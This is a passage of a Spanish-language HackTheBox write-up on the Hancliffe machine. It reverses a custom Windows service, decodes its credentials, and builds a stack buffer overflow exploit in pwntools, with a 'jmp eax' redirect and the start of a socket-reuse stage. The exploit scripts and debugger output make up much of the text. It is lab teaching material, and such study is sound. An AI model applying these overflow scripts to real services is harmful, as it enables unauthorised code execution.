<p class="plain-text">Vamos con <code class="language-plaintext highlighter-rouge">encrypt2</code>, este inicia duplicando el argumento a password con <code class="language-plaintext highlighter-rouge">strdup</code>, inicializa <code class="language-plaintext highlighter-rouge">c</code> a <code class="language-plaintext highlighter-rouge">0</code> como contador, luego compara que no sea mas grande que la longitud que la string, mueve el byte actual a <code class="language-plaintext highlighter-rouge">eax</code> y compara si es mayor que <code class="language-plaintext highlighter-rouge">0x40</code> osea que sea igual o mayor a <code class="language-plaintext highlighter-rouge">0x41</code> que en representación ascii es <code class="language-plaintext highlighter-rouge">A</code> o mayor</p>
<a href="/hackthebox/hancliffe/19.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/19.png"></p></div></a>

<p class="plain-text">Tambien compara que sea igual o menor que <code class="language-plaintext highlighter-rouge">0x5a</code> que en ascii es <code class="language-plaintext highlighter-rouge">Z</code>, realiza la misma comparación con <code class="language-plaintext highlighter-rouge">a</code> y <code class="language-plaintext highlighter-rouge">z</code> minuscula por lo que podriamos tomarlo como un <code class="language-plaintext highlighter-rouge">if</code> que compara que el byte esté entre <code class="language-plaintext highlighter-rouge">A-Z</code> o <code class="language-plaintext highlighter-rouge">a-z</code>, luego compara si el caracter es mayuscula o minuscula, dependiendo del resultado de la un valor a la variable <code class="language-plaintext highlighter-rouge">uppercase</code>, en el caso de que sea mayuscula la convierte a minuscula agregando <code class="language-plaintext highlighter-rouge">0x20</code>, podemos ver su funcionamiento bastante resumido en python con <code class="language-plaintext highlighter-rouge">ord</code> y <code class="language-plaintext highlighter-rouge">chr</code></p>
<a href="/hackthebox/hancliffe/20.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/20.png"></p></div></a>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3</span><span class="p"> -q
>>> chr(ord("A") + 0x20)  
'a'
>>></span>
</code></pre></div></div><br>

<p class="plain-text">Ahora mueve el caracter ya en minuscula a <code class="language-plaintext highlighter-rouge">eax</code> y le resta <code class="language-plaintext highlighter-rouge">0x61</code>, luego mueve a <code class="language-plaintext highlighter-rouge">ecx</code> <code class="language-plaintext highlighter-rouge">0x7a</code> y le resta el valor en <code class="language-plaintext highlighter-rouge">eax</code>, por lo que podriamos describirlo como <code class="language-plaintext highlighter-rouge">0x7a - (character - 0x61)</code>, esto si lo vemos en python convierte la <code class="language-plaintext highlighter-rouge">a</code> en <code class="language-plaintext highlighter-rouge">z</code>, la <code class="language-plaintext highlighter-rouge">b</code> en <code class="language-plaintext highlighter-rouge">y</code>, la <code class="language-plaintext highlighter-rouge">c</code> en <code class="language-plaintext highlighter-rouge">x</code>, esto se llama cifrado espejo o <a href="https://es.wikipedia.org/wiki/Atbash">atbash</a>, ya tenemos todoss los cifrados</p>
<a href="/hackthebox/hancliffe/21.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/21.png"></p></div></a>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3</span><span class="p"> -q
>>> chr(0x7a - (ord("a") - 0x61))  
'z'
>>> chr(0x7a - (ord("b") - 0x61))  
'y'
>>> chr(0x7a - (ord("c") - 0x61))  
'x'
>>></span>
</code></pre></div></div><br>

<p class="plain-text">Al ser cifrados sencillos podemos decifrar la cadena ayudandonos de <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Atbash_Cipher()ROT47(47)&input=WVhsWWVEdHNiRDk4ZUR0c1dtczVTeVU9">cyberchef</a>, ahora tenemos el usuario y contraseña en texto plano y podemos autenticarnos</p>
<a href="/hackthebox/hancliffe/28.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/28.png"></p></div></a>

<p class="plain-text">Volvemos a <code class="language-plaintext highlighter-rouge">cHandler</code>, después de llamar a <code class="language-plaintext highlighter-rouge">auth</code> si este devuelve <code class="language-plaintext highlighter-rouge">true</code> reserva un espacio en memoria y ahora recibe el campo <code class="language-plaintext highlighter-rouge">fullname</code>, si auth devuelve <code class="language-plaintext highlighter-rouge">false</code> simplemente cierra el socket enviando un mensaje de credenciales incorrectas</p>
<a href="/hackthebox/hancliffe/22.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/22.png"></p></div></a>

<p class="plain-text">El siguiente bloque reserva un espacio en memoria esta vez para un campo <code class="language-plaintext highlighter-rouge">code</code>, luego llama a <code class="language-plaintext highlighter-rouge">SaveCreds</code> pasandole el buffer recibido como argumento, luego compara lo que esta función devuelve con la string <code class="language-plaintext highlighter-rouge">T3D83CbJkl1299</code></p>
<a href="/hackthebox/hancliffe/24.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/24.png"></p></div></a>

<p class="plain-text">Si el código correcto compara que la variable <code class="language-plaintext highlighter-rouge">fullname</code> sea igual a <code class="language-plaintext highlighter-rouge">Vickry Alfiansyah</code> para enviar el mensaje <code class="language-plaintext highlighter-rouge">Unlocked</code>, si es incorrecto envia un mensaje y cierra el socket</p>
<a href="/hackthebox/hancliffe/25.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/25.png"></p></div></a>

<p class="plain-text">Ya obtenida la contraseña podemos autenticarnos al servicio con todos los datos que hemos conseguido, y aunque nos dice <code class="language-plaintext highlighter-rouge">Unlocked</code> no podemos hacer nada</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ netcat </span><span class="p">192.168.100.5 9232
Welcome Brankas Application.     
Username: alfiansyah
Password: K3r4j@@nM4j@pAh!T
Login Successfully!
FullName: Vickry Alfiansyah
Input Your Code: T3D83CbJkl1299
Unlocked</span>
</code></pre></div></div><br>

<p class="plain-text">Si revisamos la función <code class="language-plaintext highlighter-rouge">SaveCreds</code> que recibe el código copia este código a un destino que se encuentra en <code class="language-plaintext highlighter-rouge">ebp - 62</code>, esto es importante porque si enviamos un payload mayor a eso ocasionaremos un buffer overflow sobrescribiendo otros datos</p>
<a href="/hackthebox/hancliffe/26.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/26.png"></p></div></a>

<p class="plain-text">Para poder debuggear el ejecutable ejecutaremos la aplicación dentro <code class="language-plaintext highlighter-rouge">WinDbg</code></p>
<a href="/hackthebox/hancliffe/27.png" target="_blank"><div><p><img src="/hackthebox/hancliffe/27.png"></p></div></a>

<p class="plain-text">Si el buffer reservado para el código se encuentra en <code class="language-plaintext highlighter-rouge">ebp - 62</code> enviaremos <code class="language-plaintext highlighter-rouge">A's</code> para llenar ese buffer, luego enviaremos <code class="language-plaintext highlighter-rouge">4 B's</code> para el valor que tomará <code class="language-plaintext highlighter-rouge">ebp</code>, <code class="language-plaintext highlighter-rouge">4 C's</code> que sobrescribirán la dirección de retorno y <code class="language-plaintext highlighter-rouge">30 D's</code> que solo se guardarán en el stack</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3</span><span class="p">
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log, sys

</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)
    sys.exit(</span><span class="mi">1</span><span class="p">)

payload  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 62</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 30</span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])

shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)  
shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)  
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>
</code></pre></div></div><br>

<p class="plain-text">Algo a tener en cuenta es que como vimos al reversear el puerto es dinamico por lo que es mas sencillo pasarle el puerto al script simplemente como un argumento</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3</span><span class="p"> exploit.py 9217
[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9217: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9217</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el exploit podemos ver que las <code class="language-plaintext highlighter-rouge">B's</code> sobrescriben el valor de <code class="language-plaintext highlighter-rouge">ebp</code> y las <code class="language-plaintext highlighter-rouge">C's</code> sobrescriben el retorno, sin embargo solo hay una cosa que no se representó correctamente y es que de las <code class="language-plaintext highlighter-rouge">30 D's</code> enviadas solo se guardaron <code class="language-plaintext highlighter-rouge">10</code> en el stack</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> g
(2bb8.1a84): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00d6fed6 ebx=0000015c ecx=007b3db4 edx=00000000 esi=71901a3d edi=71901a3d  
eip=43434343 esp=00d6ff1c ebp=42424242 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246  
43434343 ??              ???

</span><span class="ro">0:000></span><span class="p"> r ebp
ebp=42424242

</span><span class="ro">0:000></span><span class="p"> r eip
eip=43434343

</span><span class="ro">0:000></span><span class="p"> db esp
00d6ff1c  44 44 44 44 44 44 44 44-44 44 ab ab ab ab ab ab  DDDDDDDDDD......
00d6ff2c  ab ab 00 00 00 00 00 00-00 4b 33 72 34 6a 40 40  .........K3r4j@@
00d6ff3c  6e 4d 34 6a 40 70 41 68-21 54 61 6c 66 69 61 6e  nM4j@pAh!Talfian
00d6ff4c  73 79 61 68 12 00 00 00-c0 3d 7b 00 58 3d 7b 00  syah.....={.X={.
00d6ff5c  01 00 00 00 1d 00 00 00-5c 01 00 00 10 39 7b 00  ........\....9{.
00d6ff6c  00 00 00 00 00 00 00 00-84 ff d6 00 a9 7b 8a 77  .............{.w
00d6ff7c  5c 01 00 00 90 7b 8a 77-dc ff d6 00 0b c1 a1 77  \....{.w.......w
00d6ff8c  5c 01 00 00 f0 89 50 5f-00 00 00 00 00 00 00 00  \.....P_........</span>
</code></pre></div></div><br>

<p class="plain-text">Solo <code class="language-plaintext highlighter-rouge">10</code> bytes es muy poco incluso para otras técnicas como egghunters, por suerte según <a href="https://learn.microsoft.com/es-es/cpp/c-runtime-library/reference/strcpy-wcscpy-mbscpy?view=msvc-170#return-value">documentación</a> oficial de microsoft <code class="language-plaintext highlighter-rouge">strcpy</code> retorna un puntero al buffer de destino por lo que en <code class="language-plaintext highlighter-rouge">eax</code> se almacena la dirección del inicio de nuestro payload</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> db eax
00d6fed6  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
00d6fee6  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
00d6fef6  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA  
00d6ff06  41 41 41 41 41 41 41 41-41 41 41 41 41 41 42 42  AAAAAAAAAAAAAABB  
00d6ff16  42 42 43 43 43 43 44 44-44 44 44 44 44 44 44 44  BBCCCCDDDDDDDDDD  
00d6ff26  ab ab ab ab ab ab ab ab-00 00 00 00 00 00 00 4b  ...............K  
00d6ff36  33 72 34 6a 40 40 6e 4d-34 6a 40 70 41 68 21 54  3r4j@@nM4j@pAh!T  
00d6ff46  61 6c 66 69 61 6e 73 79-61 68 12 00 00 00 c0 3d  alfiansyah.....=  </span>
</code></pre></div></div><br>

<p class="plain-text">En lugar de saltar a <code class="language-plaintext highlighter-rouge">esp</code> saltaremos a <code class="language-plaintext highlighter-rouge">eax</code>, de esta forma tendremos <code class="language-plaintext highlighter-rouge">66</code> bytes disponibles, aun no son suficientes para un shellcode pero es mejor que los <code class="language-plaintext highlighter-rouge">10</code> bytes de antes, con <code class="language-plaintext highlighter-rouge">mona</code> podemos obtener una dirección que ejecute ese <code class="language-plaintext highlighter-rouge">jmp eax</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> !py mona jmp -r eax -m myfirstapp.exe
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py jmp -r eax -m myfirstapp.exe

[+] Processing arguments and criteria
    - Pointer access level : X
    - Only querying modules myfirstapp.exe
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
[+] Querying 1 modules
    - Querying module MyFirstApp.exe
    - Search complete, processing results
[+] Preparing output file 'jmp.txt'
    - (Re)setting logfile C:\mona\jmp.txt
[+] Writing results to C:\mona\jmp.txt
    - Number of pointers of type 'jmp eax' : 2 
    - Number of pointers of type 'call eax' : 60 
[+] Results : 
0x719023b3 |   0x719023b3 : jmp eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x71902c5f |   0x71902c5f : jmp eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x71901212 |   0x71901212 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x719015a6 |   0x719015a6 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x7190167a |   0x7190167a : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x71901708 |   0x71901708 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x7190172e |   0x7190172e : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x71901765 |   0x71901765 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x71901778 |   0x71901778 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x71901798 |   0x71901798 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x719017a2 |   0x719017a2 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x7190180e |   0x7190180e : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x7190185b |   0x7190185b : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x7190186e |   0x7190186e : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x719018a7 |   0x719018a7 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x719018ba |   0x719018ba : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x719018da |   0x719018da : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x719018ea |   0x719018ea : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x719018f4 |   0x719018f4 : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
0x7190191f |   0x7190191f : call eax |  {PAGE_EXECUTE_READ} [MyFirstApp.exe] ASLR: False, Rebase: False, SafeSEH: False, CFG: False, OS: False, v-1.0-, 0x0  
... Please wait while I'm processing all remaining results and writing everything to file... 
[+] Done. Only the first 20 pointers are shown here. For more pointers, open C:\mona\jmp.txt...
    Found a total of 62 pointers</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora en la dirección de retorno ejecutaremos el <code class="language-plaintext highlighter-rouge">jmp eax</code> por lo que saltará al inicio de nuestro payload e intentará representar las <code class="language-plaintext highlighter-rouge">A's</code> que enviamos como junk</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log, sys, p32

</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)
    sys.exit(</span><span class="mi">1</span><span class="p">)

offset </span><span class="o">= </span><span class="mi">66</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> * </span><span class="p">offset

payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> junk
payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])

shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)  
shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)  
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos comprobarlo ejecutando el exploit, al caer en el breakpoint del salto y ejecutarlo podemos ver que ahora en <code class="language-plaintext highlighter-rouge">eip</code> están las <code class="language-plaintext highlighter-rouge">A's</code>, pero aun tenemos la limitación de solo <code class="language-plaintext highlighter-rouge">66</code> bytes, en este post veremos <code class="language-plaintext highlighter-rouge">3</code> formas de explotación</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">bp 0x719023b3

</span><span class="ro">0:000> </span><span class="p">g
Breakpoint 0 hit
eax=0101fed6 ebx=00000138 ecx=00c13b70 edx=000a7190 esi=71901a3d edi=71901a3d  
eip=719023b3 esp=0101ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
MyFirstApp+0x23b3:
719023b3 ffe0            jmp     eax {0101fed6}

</span><span class="ro">0:000></span><span class="p"> p
eax=0101fed6 ebx=00000138 ecx=00c13b70 edx=000a7190 esi=71901a3d edi=71901a3d  
eip=0101fed6 esp=0101ff1c ebp=41414141 iopl=0         nv up ei pl zr na pe nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246  
0101fed6 41              inc     ecx

</span><span class="ro">0:000></span><span class="p"> db eip
0101fed6  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0101fee6  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0101fef6  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0101ff06  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0101ff16  41 41 b3 23 90 71 0a 00-c1 00 90 3b c1 00 50 00  AA.#.q.....;..P.
0101ff26  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 4b  ...............K
0101ff36  33 72 34 6a 40 40 6e 4d-34 6a 40 70 41 68 21 54  3r4j@@nM4j@pAh!T
0101ff46  61 6c 66 69 61 6e 73 79-61 68 12 00 00 00 90 3b  alfiansyah.....;</span>
</code></pre></div></div><br>


</section>

<section class="post" id="bof-socketreuse">
<br><h3 class="post-title">Buffer Overflow - socket reuse</h3><br>

<p class="plain-text">La primera forma de explotarlo es haciendo uso de la funcion <code class="language-plaintext highlighter-rouge">recv()</code> para recibir datos de nuevo del <code class="language-plaintext highlighter-rouge">socket</code> y ahi poder enviar nuestro shellcode a ejecutar</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> !py mona getiat -m myfirstapp.exe -s recv
Hold on...
[+] Command used:
!py C:\Users\user\Documents\windbg\x86\mona.py getiat -m myfirstapp.exe -s recv

[+] Processing arguments and criteria
    - Pointer access level : X
    - Only querying modules myfirstapp.exe
[+] Generating module info table, hang on...
    - Processing modules
    - Done. Let's rock 'n roll.
[+] Querying 1 modules
[+] Preparing output file 'iatsearch.txt'
    - (Re)setting logfile C:\mona\iatsearch.txt
    Getting IAT for MyFirstApp.exe.
    Enumerating IAT
0x719082ac | At 0x719082ac in myfirstapp (base + 0x000082ac) : 0x766e5f50 (ptr to WS2_32.recv)  - [WS2_32] ASLR: True, Rebase: True, SafeSEH: False, CFG: True, OS: True, v10.0.22621.1 WS2_32.dll, 0x4140  

1 entries found</span>
</code></pre></div></div><br>

<p class="plain-text">Mirando la <a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv">documentación</a> esta funcion requiere 4 parametros, el <code class="language-plaintext highlighter-rouge">descriptor</code> del socket, la <code class="language-plaintext highlighter-rouge">direccion</code> donde se escribiran los datos, la <code class="language-plaintext highlighter-rouge">longitud</code> maxima que podra recibir y por ultimo las <code class="language-plaintext highlighter-rouge">flags</code> que generalmente se puede dejar simplemente en <code class="language-plaintext highlighter-rouge">0</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">int </span><span class="na">recv</span><span class="p">(
  [</span><span class="mi">in</span><span class="p">]  SOCKET s,
  [</span><span class="mi">out</span><span class="p">] </span><span class="no">char   </span><span class="o">*</span><span class="p">buf,
  [</span><span class="mi">in</span><span class="p">]  </span><span class="no">int    </span><span class="p">len,
  [</span><span class="mi">in</span><span class="p">]  </span><span class="no">int    </span><span class="p">flags
);</span>
</code></pre></div></div><br>

<p class="plain-text">Estos <code class="language-plaintext highlighter-rouge">argumentos</code> se pasan simplemente haciendoles un <code class="language-plaintext highlighter-rouge">push</code> en orden inverso para dejarlos en la pila, para entenderlo podemos hacer un breakpoint en el <code class="language-plaintext highlighter-rouge">recv</code>, los argumentos podemos establecerlos a nuestro gusto excepto uno, el descriptor del socket ya que al reutilizarlo necesitamos que sea el mismo que el inicial</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> bp 0x71901d74

</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
eax=00000140 ebx=00000140 ecx=00000002 edx=00fcff08 esi=71901a3d edi=71901a3d
eip=71901d74 esp=00fcff1c ebp=00fcff74 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
MyFirstApp+0x1d74:
71901d74 a1ac829071      mov     eax,dword ptr [MyFirstApp+0x82ac (719082ac)] ds:002b:719082ac={WS2_32!recv (766e5f50)}  

</span><span class="ro">0:000></span><span class="p"> dds esp L4
00fcff1c  00000140
00fcff20  00bc36e0
00fcff24  00000400
00fcff28  00000000</span>
</code></pre></div></div><br>

<p class="plain-text">Unas instrucciones antes de la llamada podemos ver como establece los argumentos, el primero que es el descriptor lo toma de <code class="language-plaintext highlighter-rouge">ebp - 0x10</code>, sabemos su ubicación pero no podemos tomarla relativa a <code class="language-plaintext highlighter-rouge">ebp</code> ya que al explotar el buffer overflow sobrescribimos este puntero, asi que podemos calcularla relativa a <code class="language-plaintext highlighter-rouge">esp</code> que sería <code class="language-plaintext highlighter-rouge">esp + 0x48</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> u eip-6 L4
MyFirstApp+0x1d6e:
71901d6e 8b45f0          mov     eax,dword ptr [ebp-10h]
71901d71 890424          mov     dword ptr [esp],eax
71901d74 a1ac829071      mov     eax,dword ptr [MyFirstApp+0x82ac (719082ac)]  
71901d79 ffd0            call    eax

</span><span class="ro">0:000></span><span class="p"> dd ebp - 0x10 L1
00fcff64  00000140

</span><span class="ro">0:000></span><span class="p"> ? (ebp - 0x10) - esp
Evaluate expression: 72 = 00000048

</span><span class="ro">0:000></span><span class="p"> dd esp + 0x48 L1
00fcff64  00000140</span>
</code></pre></div></div><br>

<p class="plain-text">La primera instruccion que ejecutaremos sera mover a <code class="language-plaintext highlighter-rouge">esi</code> el contenido de la direccion <code class="language-plaintext highlighter-rouge">esp + 0x48</code> para asi almacenar el descriptor antes de alterar el stack</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote, log, sys, p32, asm

</span><span class="o">if </span><span class="no">len</span><span class="p">(sys.argv) </span><span class="o">< </span><span class="mi">2</span><span class="p">:
    log.failure(</span><span class="no">f</span><span class="s">"Usage: python3 </span><span class="p">{sys.argv[</span><span class="mi">0</span><span class="p">]}</span><span class="s"> &ltport>"</span><span class="p">)
    sys.exit(</span><span class="mi">1</span><span class="p">)

recv  </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
recv </span><span class="o">+= </span><span class="p">asm(</span><span class="s">"mov esi, [esp + 0x48]"</span><span class="p">)

offset </span><span class="o">= </span><span class="mi">66</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">(offset </span><span class="o">- </span><span class="no">len</span><span class="p">(recv))

payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> recv
payload</span><span class="o"> +=</span><span class="p"> junk
payload</span><span class="o"> += </span><span class="p">p32(</span><span class="mi">0x719023b3</span><span class="p">)</span><span class="c1"> # jmp eax;</span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, sys.argv[</span><span class="mi">1</span><span class="p">])

shell.sendlineafter(</span><span class="no">b</span><span class="s">"Username: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"alfiansyah"</span><span class="p">)
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Password: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"K3r4j@@nM4j@pAh!T"</span><span class="p">)  
shell.sendlineafter(</span><span class="no">b</span><span class="s">"FullName: "</span><span class="p">,</span><span class="no"> b</span><span class="s">"Vickry Alfiansyah"</span><span class="p">)  
shell.sendlineafter(</span><span class="no">b</span><span class="s">"Input Your Code: "</span><span class="p">, payload)</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar la instruccion despues de saltar a <code class="language-plaintext highlighter-rouge">eax</code> podemos ver que el descriptor del socket se ha almacenado correctamente en el registro <code class="language-plaintext highlighter-rouge">esi</code> que usaremos después</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> bp 0x719023b3

</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
